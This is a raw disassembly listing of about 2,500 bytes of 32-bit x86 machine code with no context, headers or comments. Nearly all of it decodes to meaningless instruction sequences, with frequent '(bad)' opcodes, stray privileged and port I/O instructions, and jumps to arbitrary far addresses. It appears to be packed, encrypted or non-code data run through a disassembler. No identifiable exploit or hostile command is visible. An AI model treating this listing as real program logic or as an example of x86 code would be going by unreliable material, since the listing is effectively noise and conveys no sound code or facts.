  42221d:	shr    DWORD PTR [ecx-0x55],0x30
  422221:	push   edi
  422222:	nop
  422223:	cmp    edx,edi
  422225:	or     ecx,ebx
  422227:	pop    ebx
  422228:	jo     0x422211
  42222a:	ret    0x6b61
  42222d:	sbb    al,0xda
  42222f:	inc    edx
  422230:	mov    edi,0x6b76eab5
  422235:	jl     0x422241
  422237:	or     al,0x7e
  422239:	mov    esp,0xbc20ac6c
  42223e:	inc    ecx
  42223f:	loop   0x4221f7
  422241:	add    esp,eax
  422243:	sub    BYTE PTR [ebx],0x7e
  422246:	inc    ebx
  422247:	xchg   ebx,eax
  422248:	pop    ebp
  422249:	xor    BYTE PTR ds:0xbcb8b7a0,bl
  42224f:	retf   
  422250:	dec    edx
  422251:	xor    al,0xbb
  422253:	dec    esi
  422254:	or     edx,ecx
  422256:	pop    edi
  422257:	gs cli 
  422259:	push   esp
  42225a:	ficomp WORD PTR [ecx-0xb]
  42225d:	xor    bh,BYTE PTR [esi]
  42225f:	jg     0x422233
  422261:	pop    ss
  422262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422263:	int3   
  422264:	loopne 0x42228c
  422266:	push   cs
  422267:	cs ret 0xe584
  42226b:	push   cs
  42226c:	loope  0x422229
  42226e:	nop
  42226f:	(bad)  
  422270:	es add eax,0x8256b742
  422276:	and    DWORD PTR [edi],edx
  422278:	ror    BYTE PTR [edi-0x55],1
  42227b:	mov    bh,0x8a
  42227d:	push   esi
  42227e:	pop    esi
  42227f:	sbb    eax,DWORD PTR [esi+esi*2-0x6eee4e9a]
  422286:	fadd   DWORD PTR [esi]
  422288:	dec    esp
  422289:	adc    al,0xd6
  42228b:	add    al,0xb6
  42228d:	out    dx,al
  42228e:	xchg   ebp,eax
  42228f:	add    BYTE PTR cs:[eax],al
	...
  4222f2:	add    BYTE PTR [eax],al
  4222f4:	(bad)  
  4222f5:	in     eax,dx
  4222f6:	lods   eax,DWORD PTR ds:[esi]
  4222f7:	imul   edi
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	cmp    DWORD PTR [esi+0x6c3c7753],edi
  422306:	add    DWORD PTR [eax],eax
  422308:	add    al,0x1
  42230a:	add    BYTE PTR [eax],al
  42230c:	mov    fs,WORD PTR [ebx-0x387a876f]
  422312:	mov    esi,0xd437e398
  422317:	call   0xc5905633
  42231c:	call   0x1c36:0xd901e1b2
  422323:	jmp    0x1999634b
  422328:	inc    edx
  422329:	test   DWORD PTR [esp+edi*1-0xe139aaa],eax
  422330:	and    DWORD PTR [ebx-0x6b6bf439],edi
  422336:	retf   
  422337:	retf   0x58ac
  42233a:	repz sbb al,0x35
  42233d:	add    esp,DWORD PTR [esi]
  42233f:	mov    edi,0xd2898689
  422344:	clc    
  422345:	(bad)  
  422346:	push   ebx
  422347:	(bad)  [ecx]
  422349:	push   0xffffffff
  42234b:	popa   
  42234c:	sub    eax,eax
  42234e:	mov    ah,0x47
  422350:	icebp  
  422351:	xchg   edx,eax
  422352:	sub    eax,0x48b09cd0
  422357:	(bad)  
  422358:	cdq    
  422359:	iret   
  42235a:	dec    ebx
  42235b:	ret    0xbec7
  42235e:	or     DWORD PTR [edx+0x4047b449],eax
  422364:	ret    
  422365:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422366:	and    eax,0xdcc10636
  42236b:	mov    edi,0xb83b982b
  422370:	push   eax
  422371:	loop   0x42234f
  422373:	call   0x233d:0x7cf6a774
  42237a:	shr    BYTE PTR [edx-0x80],cl
  42237d:	pop    esp
  42237e:	ret    0xa6aa
  422381:	jp     0x42239a
  422383:	imul   esp,DWORD PTR [eax+0x65],0xf8fb136f
  42238a:	shr    DWORD PTR [ebp+0x6c],1
  42238d:	cld    
  42238e:	pop    ebp
  42238f:	push   ebx
  422390:	fiadd  DWORD PTR [edi+0x2ce3cf36]
  422396:	loop   0x4223e9
  422398:	(bad)  
  422399:	daa    
  42239a:	push   ebp
  42239b:	xlat   BYTE PTR ds:[ebx]
  42239c:	addr16 aad 0x63
  42239f:	cdq    
  4223a0:	jmp    DWORD PTR [edi-0xb]
  4223a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223a4:	push   es
  4223a5:	cmc    
  4223a6:	pusha  
  4223a7:	loop   0x422333
  4223a9:	addr16 pop ecx
  4223ab:	cmp    edi,DWORD PTR [eax+0x5e285943]
  4223b1:	sub    al,BYTE PTR [ebx+0x6a]
  4223b4:	jmp    0x1017f7af
  4223b9:	mov    esi,0x6e61d8e6
  4223be:	sbb    DWORD PTR [eax],0xffffff9c
  4223c1:	std    
  4223c2:	pop    ebp
  4223c3:	je     0x422433
  4223c5:	sar    DWORD PTR [esi-0x70a32bf9],0x12
  4223cc:	and    ch,BYTE PTR [ebx+0x4c]
  4223cf:	lahf   
  4223d0:	pop    ebp
  4223d1:	outs   dx,BYTE PTR ds:[esi]
  4223d2:	ret    
  4223d3:	add    DWORD PTR [ebx+eax*4-0x7c9a3d53],esp
  4223da:	out    0xb5,al
  4223dc:	stos   BYTE PTR es:[edi],al
  4223dd:	shr    DWORD PTR [eax-0x15],cl
  4223e0:	js     0x42241f
  4223e2:	enter  0xfd00,0x6b
  4223e6:	push   ebx
  4223e7:	fist   DWORD PTR [edi-0x197108e7]
  4223ed:	aad    0x55
  4223ef:	test   eax,0x5077aaec
  4223f4:	inc    ebx
  4223f5:	jns    0x422393
  4223f7:	dec    edi
  4223f8:	jne    0x42237a
  4223fa:	rcr    BYTE PTR [ebp-0x3964b537],cl
  422400:	es pop edx
  422402:	scas   al,BYTE PTR es:[edi]
  422403:	les    ebx,FWORD PTR [ecx-0x73328a68]
  422409:	aam    0x1d
  42240b:	mov    dl,0x4d
  42240d:	daa    
  42240e:	in     eax,dx
  42240f:	push   esp
	...
  422474:	push   edx
  422475:	sub    BYTE PTR [esi],0x69
  422478:	(bad)  
  422479:	in     eax,dx
  42247a:	push   edi
  42247b:	mov    ebx,0x99e531bb
  422480:	mov    bl,0xfc
  422482:	shr    DWORD PTR [edi],1
  422484:	inc    eax
  422485:	ins    DWORD PTR es:[edi],dx
  422486:	add    DWORD PTR [eax],eax
  422488:	add    al,0x1
  42248a:	add    BYTE PTR [eax],al
  42248c:	sub    BYTE PTR [ebx+0x571a82ce],cl
  422492:	mov    cl,0x9e
  422494:	stc    
  422495:	daa    
  422496:	leave  
  422497:	inc    edx
  422498:	sbb    eax,0xb2b6363b
  42249d:	stos   DWORD PTR es:[edi],eax
  42249e:	mov    eax,ds:0x5d2db18f
  4224a3:	sbb    dl,BYTE PTR [esi]
  4224a5:	jp     0x422469
  4224a7:	push   edi
  4224a8:	adc    DWORD PTR [ebp+0x51],esp
  4224ab:	sbb    eax,0x5e48802c
  4224b0:	sbb    BYTE PTR [ebx-0x316b2e5c],bh
  4224b6:	xor    ebx,edx
  4224b8:	out    0xe1,eax
  4224ba:	and    al,0xbc
  4224bc:	lock dec esp
  4224be:	jl     0x42250c
  4224c0:	pop    eax
  4224c1:	xor    al,0x93
  4224c3:	js     0x4224a6
  4224c5:	test   eax,0xaa5499af
  4224ca:	and    ecx,DWORD PTR [edx-0x309c52ab]
  4224d0:	(bad)  
  4224d2:	jmp    0x4224a0
  4224d4:	int3   
  4224d5:	add    edi,edi
  4224d7:	imul   ebp,DWORD PTR [esi-0xa670506],0x34
  4224de:	inc    ecx
  4224df:	mov    ds,edi
  4224e1:	into   
  4224e2:	call   0x334fbf4d
  4224e7:	fcomp  DWORD PTR [ebx+esi*8]
  4224ea:	fdiv   st,st(6)
  4224ec:	es dec edi
  4224ee:	sbb    al,0x15
  4224f0:	xchg   ecx,eax
  4224f1:	or     al,0x53
  4224f3:	sub    al,0xcb
  4224f5:	adc    ebp,DWORD PTR [edx-0x3e]
  4224f8:	push   edx
  4224f9:	sub    edx,edi
  4224fb:	retf   0x5ece
  4224fe:	cmp    ah,BYTE PTR [edi+0x54]
  422501:	loopne 0x42248c
  422503:	xor    BYTE PTR [ecx-0x1a],bl
  422506:	pop    esp
  422507:	repz js 0x422575
  42250a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42250b:	xor    BYTE PTR [ebp+0x32],al
  42250e:	fwait
  42250f:	dec    ebp
  422510:	loopne 0x4224d4
  422512:	cs pop ds
  422514:	iret   
  422515:	loope  0x4224d8
  422517:	xchg   edi,eax
  422518:	inc    esi
  422519:	test   DWORD PTR [ebx],edx
  42251b:	push   0xc63292fb
  422520:	fwait
  422521:	and    al,BYTE PTR [ebx+0x71c68f9c]
  422527:	mov    al,0xb6
  422529:	inc    edi
  42252a:	shl    dl,1
  42252c:	mov    cl,0x2e
  42252e:	retf   0x281c
  422531:	aam    0xfa
  422533:	xor    al,0x50
  422535:	daa    
  422536:	sbb    DWORD PTR [esp+ecx*8-0x5c38044b],0xffffffea
  42253e:	adc    eax,edx
  422540:	scas   al,BYTE PTR es:[edi]
  422541:	and    al,BYTE PTR [edi]
  422543:	ret    0xa248
  422546:	int    0xe1
  422548:	mov    ds:0x2ca26f10,eax
  42254d:	cmp    ebx,edx
  42254f:	jl     0x422523
  422551:	stos   DWORD PTR es:[edi],eax
  422552:	sbb    ecx,DWORD PTR ss:[ecx-0x44]
  422556:	cmp    BYTE PTR [eax],0x86
  422559:	not    BYTE PTR [esi+esi*8-0x1c]
  42255d:	mov    dl,0xeb
  42255f:	cmp    DWORD PTR [ecx+0x69],edx
  422562:	jne    0x4225dc
  422564:	bound  eax,QWORD PTR [edi+edi*4]
  422567:	sub    BYTE PTR [esi+esi*4],bh
  42256a:	jmp    0x42253f
  42256c:	adc    DWORD PTR [edx+edi*8],edi
  42256f:	ins    BYTE PTR es:[edi],dx
  422570:	repnz in al,0xab
  422573:	stc    
  422574:	jmp    FWORD PTR [ebx+0x7c6c9d43]
  42257a:	cmp    edx,DWORD PTR [ebp-0x4d2cce1e]
  422580:	and    esi,eax
  422582:	pop    ss
  422583:	adc    esp,DWORD PTR [ecx+eiz*1]
  422586:	scas   al,BYTE PTR es:[edi]
  422587:	mov    bh,0xb7
  422589:	fild   DWORD PTR [esi-0x6e5f183c]
  42258f:	and    BYTE PTR [eax],al
	...
  4225f1:	add    BYTE PTR [eax],al
  4225f3:	add    BYTE PTR [edx-0x40887052],bl
  4225f9:	ja     0x4225f5
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx-0x62c15d08]
  422602:	inc    esp
  422603:	xchg   edx,eax
  422604:	inc    esp
  422605:	outs   dx,BYTE PTR ds:[esi]
  422606:	add    DWORD PTR [eax],eax
  422608:	add    al,0x1
  42260a:	add    BYTE PTR [eax],al
  42260c:	ss (bad) 
  42260e:	loop   0x42266b
  422610:	pushf  
  422611:	adc    DWORD PTR [edi],esp
  422613:	add    esi,esp
  422615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422616:	data16 arpl WORD PTR [ecx],dx
  422619:	stos   BYTE PTR es:[edi],al
  42261a:	cwde   
  42261b:	xlat   BYTE PTR cs:[ebx]
  42261d:	retf   
  42261e:	jmp    0xe7d5:0x6186b0dc
  422625:	cmp    BYTE PTR gs:[ecx+0x7a],cl
  422629:	out    dx,eax
  42262a:	out    dx,al
  42262b:	aaa    
  42262c:	push   0x7c
  42262e:	iret   
  42262f:	pop    esi
  422630:	test   al,0xda
  422632:	pop    edi
  422633:	pop    esp
  422634:	dec    esi
  422635:	aam    0x92
  422637:	mov    ah,0x3e
  422639:	mov    edx,0x12e3ec08
  42263e:	and    BYTE PTR [esi-0x62d73da],dl
  422644:	and    al,BYTE PTR [ecx]
  422646:	pop    ds
  422647:	aaa    
  422648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422649:	jnp    0x42268c
  42264b:	call   0xf95e48ff
  422650:	frstor [ebp+0x3f]
  422653:	adc    DWORD PTR ds:[ebx],ebp
  422656:	aas    
  422657:	adc    DWORD PTR [ebx-0xaf229a8],ebp
  42265d:	scas   eax,DWORD PTR es:[edi]
  42265e:	mov    ebx,0xea415ce1
  422663:	outs   dx,DWORD PTR ds:[esi]
  422664:	or     edi,DWORD PTR [ebx+0x34]
  422667:	xchg   ebx,eax
  422668:	sbb    edi,DWORD PTR [esi+0xf]
  42266b:	bound  ebp,QWORD PTR [edx-0x40ee3c8b]
  422671:	cs shl edx,0xd0
  422675:	popf   
  422676:	mov    ds:0x178cbc51,eax
  42267b:	push   ebp
  42267c:	test   al,0xad
  42267e:	cmp    DWORD PTR [edx],ecx
  422680:	inc    edx
  422681:	scas   al,BYTE PTR es:[edi]
  422682:	outs   dx,BYTE PTR ds:[esi]
  422683:	and    BYTE PTR [ebp+0x25],al
  422686:	lahf   
  422687:	mov    al,0x38
  422689:	scas   al,BYTE PTR es:[edi]
  42268a:	or     esp,esi
  42268c:	scas   al,BYTE PTR es:[edi]
  42268d:	and    dl,bl
  42268f:	xor    BYTE PTR [ebp-0x1c],0xba
  422693:	daa    
  422694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422695:	cs dec ebx
  422697:	outs   dx,BYTE PTR ds:[esi]
  422698:	sub    eax,0x267cbec5
  42269d:	pop    eax
  42269e:	push   esp
  42269f:	adc    BYTE PTR [edi+ecx*1],dl
  4226a2:	dec    edi
  4226a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a4:	xor    cl,bl
  4226a6:	iret   
  4226a7:	sti    
  4226a8:	xchg   esi,eax
  4226a9:	mov    dl,0xac
  4226ab:	inc    esi
  4226ac:	pop    edx
  4226ad:	inc    ebp
  4226ae:	pop    ds
  4226af:	jae    0x4226a5
  4226b1:	cmp    eax,0xb2d92f8
  4226b6:	sar    DWORD PTR [edi+0x3],1
  4226b9:	adc    eax,0xf34a334b
  4226be:	push   ebx
  4226bf:	ins    DWORD PTR es:[edi],dx
  4226c0:	inc    edi
  4226c1:	sbb    BYTE PTR [edi],ch
  4226c3:	hlt    
  4226c4:	or     al,BYTE PTR [edx-0x41ef82d6]
  4226ca:	lahf   
  4226cb:	jle    0x422674
  4226cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ce:	xor    al,0xdb
  4226d0:	test   al,0xc2
  4226d2:	(bad)  
  4226d3:	rol    BYTE PTR [edx+ebp*4],0x1c
  4226d7:	xor    ecx,esp
  4226d9:	hlt    
  4226da:	fisubr WORD PTR [edx]
  4226dc:	gs sub dh,dl
  4226df:	ins    DWORD PTR es:[edi],dx
  4226e0:	adc    ah,BYTE PTR [esi]
  4226e2:	push   0x181b44bb
  4226e7:	lods   eax,DWORD PTR ds:[esi]
  4226e8:	clc    
  4226e9:	cld    
  4226ea:	pop    ebp
  4226eb:	inc    esi
  4226ec:	mov    eax,ds:0x74ad5515
  4226f1:	inc    eax
  4226f2:	and    bl,BYTE PTR [ecx-0x52]
  4226f5:	mov    gs:0x517f3005,al
  4226fb:	mov    ecx,0x7a4e0828
  422700:	mov    bh,BYTE PTR [eax+0x52d4b09c]
  422706:	sub    eax,ebx
  422708:	push   ss
  422709:	cmp    DWORD PTR [edi+edi*1-0x4f220fa1],ebp
	...
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x257f01c8
  422781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422782:	mov    ah,0x22
  422784:	dec    eax
  422785:	outs   dx,DWORD PTR ds:[esi]
  422786:	add    DWORD PTR [eax],eax
  422788:	add    al,0x1
  42278a:	add    BYTE PTR [eax],al
  42278c:	mov    edx,0x48528ec8
  422791:	sbb    esi,DWORD PTR ds:0xdf0fb6c4
  422797:	scas   eax,DWORD PTR es:[edi]
  422798:	mov    ebx,0x69a7df60
  42279d:	jecxz  0x422740
  42279f:	mov    BYTE PTR [ecx],ch
  4227a1:	out    dx,eax
  4227a2:	test   eax,0xde845255
  4227a7:	dec    esi
  4227a8:	(bad)  
  4227a9:	and    DWORD PTR [ebx+edi*8],edx
  4227ac:	cmp    DWORD PTR [ebp-0x2d],edx
  4227af:	mov    edi,ebp
  4227b1:	imul   BYTE PTR [esi]
  4227b3:	sbb    BYTE PTR [edx+0x359eabf0],ch
  4227b9:	clc    
  4227ba:	rol    DWORD PTR [edi+ecx*1-0x3d],1
  4227be:	sub    ebx,eax
  4227c0:	pop    ss
  4227c1:	mov    bl,BYTE PTR [ebx-0x329d375b]
  4227c7:	leave  
  4227c8:	xchg   edx,eax
  4227c9:	add    eax,0xc2736d81
  4227ce:	push   ebp
  4227cf:	call   0x8aede368
  4227d4:	popa   
  4227d5:	pop    edx
  4227d6:	push   0xca38d9a5
  4227db:	ins    BYTE PTR es:[edi],dx
  4227dc:	adc    bh,BYTE PTR [esi+0x6d]
  4227df:	and    al,0xce
  4227e1:	mov    edi,0xde88a958
  4227e6:	xchg   edx,eax
  4227e7:	repnz mov edi,0xa60e2e14
  4227ed:	xchg   ecx,eax
  4227ee:	outs   dx,DWORD PTR ds:[esi]
  4227ef:	in     eax,dx
  4227f0:	mov    esi,0xab399d0a
  4227f5:	repnz sbb DWORD PTR [ebp+edi*2+0x7ca60f2b],eax
  4227fd:	cmc    
  4227fe:	mov    ds:0xc306707,eax
  422803:	cvtdq2ps xmm7,XMMWORD PTR [ebx+0x37]
  422807:	std    
  422808:	mov    ah,0x1b
  42280a:	fldcw  WORD PTR [ecx]
  42280c:	dec    eax
  42280d:	or     BYTE PTR [ebp-0x1454bd41],cl
  422813:	push   ds
  422814:	mov    ebp,0x8b2552b7
  422819:	sub    esp,edx
  42281b:	ret    
  42281c:	push   0x9617750e
  422821:	push   esi
  422822:	pop    esp
  422823:	in     al,dx
  422824:	sbb    DWORD PTR ds:0xc06c19cf,0x5d44d1ce
  42282e:	xor    DWORD PTR [edx],eax
  422830:	outs   dx,BYTE PTR ds:[esi]
  422831:	push   eax
  422832:	dec    edi
  422833:	xchg   edx,ebp
  422835:	xchg   ecx,eax
  422836:	sub    dl,dh
  422838:	pop    es
  422839:	aas    
  42283a:	dec    esi
  42283b:	xor    ch,BYTE PTR [ebp+0x19a7d8ee]
  422841:	add    al,0xea
  422843:	fisttp DWORD PTR [esi]
  422845:	shl    BYTE PTR [edx+0xc],0x39
  422849:	out    dx,al
  42284a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42284b:	push   ecx
  42284c:	loop   0x422894
  42284e:	mov    bl,0x4e
  422850:	ss mov ebx,0xd2f7a2e1
  422856:	dec    ebp
  422857:	std    
  422858:	jmp    0xfd92:0x1428f53c
  42285f:	js     0x4227e4
  422861:	mov    ebx,0x97d31828
  422866:	scas   al,BYTE PTR es:[edi]
  422867:	aam    0x76
  422869:	pop    ebp
  42286a:	data16 fwait
  42286c:	mov    dl,0x61
  42286e:	sub    eax,0xd33fc3e9
  422873:	call   0xd20c06b0
  422878:	sub    DWORD PTR [ebx],ecx
  42287a:	sub    edx,DWORD PTR [eax-0x71ac17bf]
  422880:	out    0x22,eax
  422882:	jne    0x422855
  422884:	sub    ah,ah
  422886:	jle    0x422821
  422888:	sub    BYTE PTR [esi],0x80
  42288b:	lahf   
  42288c:	stos   BYTE PTR es:[edi],al
  42288d:	sahf   
  42288e:	mov    bl,0x3f
	...
  4228f4:	int    0x39
  4228f6:	mov    eax,0xef97fc97
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x4228af
  422901:	fstp   DWORD PTR [esi-0x1e]
  422904:	dec    esp
  422905:	jo     0x422908
  422907:	add    BYTE PTR [ecx+eax*1],al
  42290a:	add    BYTE PTR [eax],al
  42290c:	lahf   
  42290d:	aad    0xa7
  42290f:	test   ecx,edx
  422911:	outs   dx,BYTE PTR ds:[esi]
  422912:	shr    BYTE PTR [esi+0x48],1
  422915:	adc    eax,0x9b4e1558
  42291a:	sar    al,1
  42291c:	dec    esi
  42291d:	and    BYTE PTR [ebp-0x4f],ch
  422920:	or     al,0xc1
  422922:	leave  
  422923:	std    
  422924:	sbb    ch,cl
  422926:	cli    
  422927:	mov    dl,0x2c
  422929:	mov    cl,0xde
  42292b:	stos   BYTE PTR es:[edi],al
  42292c:	loope  0x4229a2
  42292e:	xchg   esp,eax
  42292f:	push   es
  422930:	mov    ecx,ecx
  422932:	(bad)  
  422934:	popa   
  422935:	psubb  mm1,QWORD PTR [eax]
  422938:	jb     0x422946
  42293a:	call   0x861a:0x8f8861a2
  422941:	inc    ebp
  422942:	gs cs scas al,BYTE PTR es:[edi]
  422945:	enter  0xe7d4,0x21
  422949:	repz (bad) 
  42294b:	pop    ds
  42294c:	lods   al,BYTE PTR ds:[esi]
  42294d:	std    
  42294e:	sbb    dh,bl
  422950:	dec    ebp
  422951:	je     0x4229c7
  422953:	dec    edi
  422954:	in     eax,dx
  422955:	stos   DWORD PTR es:[edi],eax
  422956:	mov    WORD PTR [edi-0x4b309f2f],ss
  42295c:	dec    esp
  42295d:	sub    edx,DWORD PTR [eax]
  42295f:	ficomp DWORD PTR [edx]
  422961:	push   es
  422962:	mov    ebp,0xf436524b
  422967:	pop    edi
  422968:	push   ss
  422969:	cli    
  42296a:	jmp    0x74a7:0xf2aa9a55
  422971:	pop    ebp
  422972:	push   cs
  422973:	shl    BYTE PTR [ecx-0x48],cl
  422976:	mov    eax,0xb172e2d
  42297b:	mov    dh,0x95
  42297d:	pop    ebx
  42297e:	pop    ecx
  42297f:	mov    al,0x92
  422981:	adc    al,0x6e
  422983:	and    al,0xee
  422985:	cs leave 
  422987:	outs   dx,DWORD PTR ds:[esi]
  422988:	(bad)  [esp+ecx*8]
  42298b:	xchg   ecx,eax
  42298c:	dec    eax
  42298d:	addr16 dec esp
  42298f:	add    BYTE PTR [esi+0x42],cl
  422992:	lahf   
  422993:	loop   0x422984
  422995:	pop    ds
  422996:	cmp    dh,ah
  422998:	iret   
  422999:	clc    
  42299a:	ror    eax,0x1c
  42299d:	retf   0x7846
  4229a0:	rcr    DWORD PTR [esi-0x5ba6b846],0x99
  4229a7:	inc    edx
  4229a8:	pusha  
  4229a9:	mov    bl,0x72
  4229ab:	push   eax
  4229ac:	fst    st(6)
  4229ae:	enter  0x191c,0xf2
  4229b2:	mov    ah,0x4a
  4229b4:	lock js 0x422950
  4229b7:	and    al,0xde
  4229b9:	xor    eax,0xafc6f6c8
  4229be:	dec    ecx
  4229bf:	inc    esi
  4229c0:	mov    esp,DWORD PTR [eax+0x2a]
  4229c3:	pop    ebp
  4229c4:	and    eax,0x72a8216b
  4229c9:	cwde   
  4229ca:	or     al,BYTE PTR [eax-0x587e4948]
  4229d0:	push   ss
  4229d1:	ror    DWORD PTR [ebx+esi*2],cl
  4229d4:	int3   
  4229d5:	mov    dh,0x7
  4229d7:	push   eax
  4229d8:	cdq    
  4229d9:	add    BYTE PTR [ecx],dl
  4229db:	imul   esi,DWORD PTR [ebx],0x4a
  4229de:	push   esp
  4229df:	mov    dh,BYTE PTR [eax+ecx*8-0x69942dbc]
  4229e6:	shl    BYTE PTR [ecx],cl
  4229e8:	sbb    al,0x36
  4229ea:	add    BYTE PTR [ebx],dh
  4229ec:	(bad)  
  4229ed:	jge    0x422a40
  4229ef:	xor    DWORD PTR [ebx+0x5664e302],eax
  4229f5:	xchg   BYTE PTR [ecx+eax*2+0x4bbd6ded],ah
  4229fc:	enter  0xa6d2,0xa9
  422a00:	loop   0x4229a9
  422a02:	es cld 
  422a04:	cmp    DWORD PTR [ebp+0x650a00b8],0xce1c7a06
  422a0e:	jb     0x4229db
	...
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	inc    ecx
  422a81:	aas    
  422a82:	mov    edx,0x17150f1
  422a87:	add    BYTE PTR [ecx+eax*1],al
  422a8a:	add    BYTE PTR [eax],al
  422a8c:	in     eax,dx
  422a8d:	lods   al,BYTE PTR ds:[esi]
  422a8e:	fsub   DWORD PTR [edx-0x3e5fa713]
  422a94:	inc    esp
  422a95:	mov    eax,ds:0x88a83aee
  422a9a:	mov    edi,0x36c9585b
  422a9f:	sub    ebx,edi
  422aa1:	pushf  
  422aa2:	retf   0x9533
  422aa5:	(bad)  
  422aa6:	lea    esi,[edx+0x1270babd]
  422aac:	cmp    al,0xb9
  422aae:	inc    edx
  422aaf:	dec    esi
  422ab0:	xchg   DWORD PTR [ecx+0x617fe0ff],edx
  422ab6:	or     DWORD PTR [ebp+0x2454fb45],eax
  422abc:	ds inc eax
  422abe:	stos   BYTE PTR es:[edi],al
  422abf:	ret    
  422ac0:	dec    ebx
  422ac1:	popa   
  422ac2:	mov    edi,gs
  422ac4:	mov    bh,0x1a
  422ac6:	mov    ds,WORD PTR ds:0x959c6c58
  422acc:	add    DWORD PTR [ecx],edi
  422ace:	test   BYTE PTR [ebx-0x5cc7b1b],ch
  422ad4:	(bad)  
  422ad5:	push   ss
  422ad6:	dec    edi
  422ad7:	fs int 0xba
  422ada:	sti    
  422adb:	jmp    0xae9cb107
  422ae0:	fdivr  DWORD PTR [ecx]
  422ae2:	je     0x422b30
  422ae4:	mov    edx,0xf00fee72
  422ae9:	dec    edx
  422aea:	push   ecx
  422aeb:	jnp    0x422b09
  422aed:	imul   edx,DWORD PTR [ebx+eax*4-0x32],0xe4c974ff
  422af5:	test   BYTE PTR [edx+eiz*2+0x5291871c],dl
  422afc:	jmp    0x764d1ed3
  422b01:	test   BYTE PTR [edx-0x4ca3fdca],ch
  422b07:	sub    bl,BYTE PTR [ebp-0x48]
  422b0a:	aam    0x34
  422b0c:	rcl    DWORD PTR [esi-0x40a83bbe],0xeb
  422b13:	cmp    eax,0x701a5e2f
  422b18:	pusha  
  422b19:	xchg   edx,eax
  422b1a:	sub    ebp,esi
  422b1c:	cdq    
  422b1d:	jae    0x422b7d
  422b1f:	lods   al,BYTE PTR ds:[esi]
  422b20:	mov    bh,BYTE PTR [eax+0x4b]
  422b23:	pop    esi
  422b24:	dec    esp
  422b25:	sbb    ebx,DWORD PTR es:[ecx-0x79]
  422b29:	xchg   ebp,eax
  422b2a:	pushf  
  422b2b:	aad    0x35
  422b2d:	popf   
  422b2e:	pop    esp
  422b2f:	jb     0x422b13
  422b31:	das    
  422b32:	call   0x1bb2c816
  422b37:	(bad)  
  422b38:	sti    
  422b39:	je     0x422b0c
  422b3b:	dec    ebp
  422b3c:	leave  
  422b3d:	cs push edx
  422b3f:	je     0x422b98
  422b41:	or     eax,0xb9b2375c
  422b46:	dec    ebx
  422b47:	punpckldq mm3,DWORD PTR [esi-0x635ed8d9]
  422b4e:	rcr    DWORD PTR [ebx+0x61],0x41
  422b52:	pop    ebx
  422b53:	dec    ebp
  422b54:	adc    ax,0xaae7
  422b58:	(bad)
  422b5c:	stos   DWORD PTR es:[edi],eax
  422b5d:	pop    ds
  422b5e:	push   ebx
  422b5f:	pop    edi
  422b60:	dec    ebp
  422b61:	cmc    
  422b62:	mov    ebp,?
  422b64:	adc    edx,DWORD PTR [edx+0x36]
  422b67:	out    dx,eax
  422b68:	out    dx,eax
  422b69:	jg     0x422b47
  422b6b:	lock adc ch,BYTE PTR [esi+edi*4+0x5e3e71ae]
  422b73:	in     al,dx
  422b74:	adc    ch,BYTE PTR [edi]
  422b76:	dec    ecx
  422b77:	add    edx,DWORD PTR [edi+edi*2-0x593f2d5]
  422b7e:	sub    ch,dl
  422b80:	inc    ebx
  422b81:	adc    eax,0x5b2805df
  422b86:	aas    
  422b87:	pop    esp
  422b88:	jno    0x422b3e
  422b8a:	jge    0x422c02
  422b8c:	inc    esi
  422b8d:	add    esp,edx
  422b8f:	jmp    0x422b94
	...
  422bf4:	inc    esp
  422bf5:	aaa    
  422bf6:	dec    edx
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx+0x489c4d9c]
  422c02:	cdq    
  422c03:	stos   DWORD PTR es:[edi],eax
  422c04:	push   esp
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR [ecx+eax*1],al
  422c0a:	add    BYTE PTR [eax],al
  422c0c:	or     ah,BYTE PTR [ecx-0x70]
  422c0f:	sbb    al,BYTE PTR [edi-0x1e0f4115]
  422c15:	shr    BYTE PTR [edx+eiz*1],0xe
  422c19:	dec    esi
  422c1a:	pop    es
  422c1b:	xchg   esp,ecx
  422c1d:	rol    esp,1
  422c1f:	cmp    DWORD PTR [ecx-0x440599c1],eax
  422c25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c26:	mov    dl,0xfa
  422c28:	mov    al,0x66
  422c2a:	cmp    DWORD PTR [ecx+0x5f2e8f1a],edx
  422c30:	adc    al,0x2
  422c32:	inc    ebx
  422c33:	mov    cl,0xf6
  422c35:	loopne 0x422c9f
  422c37:	or     dl,cl
  422c39:	outs   dx,BYTE PTR ds:[esi]
  422c3a:	jl     0x422c59
  422c3c:	shl    BYTE PTR [ecx],1
  422c3e:	hlt    
  422c3f:	ret    0x602b
  422c42:	mov    bh,0xd7
  422c44:	inc    ebx
  422c45:	lock xor dh,BYTE PTR [eax+0x3a]
  422c49:	mov    esi,0x715d2a6a
  422c4e:	inc    esp
  422c4f:	sbb    al,0x53
  422c51:	add    dh,0x3e
  422c54:	ja     0x422cab
  422c56:	and    ah,BYTE PTR [ebx]
  422c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c59:	mov    DWORD PTR [esi+0x51],esi
  422c5c:	push   eax
